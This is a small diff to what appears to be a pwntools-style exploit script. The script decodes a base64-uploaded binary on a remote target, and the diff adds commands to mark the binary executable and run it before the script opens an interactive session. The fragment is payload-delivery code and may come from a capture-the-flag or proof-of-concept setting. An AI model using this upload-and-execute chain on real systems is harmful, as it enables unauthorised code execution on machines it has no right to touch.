@@ -33,4 +33,7 @@ while now < len(b64):
 
 log.success("base64 decoding...")
 send_cmd("base64 -d /home/user/poc > /home/user/pwn")
+send_cmd("chmod +x pwn")
+send_cmd("./pwn")
+
 r.interactive()
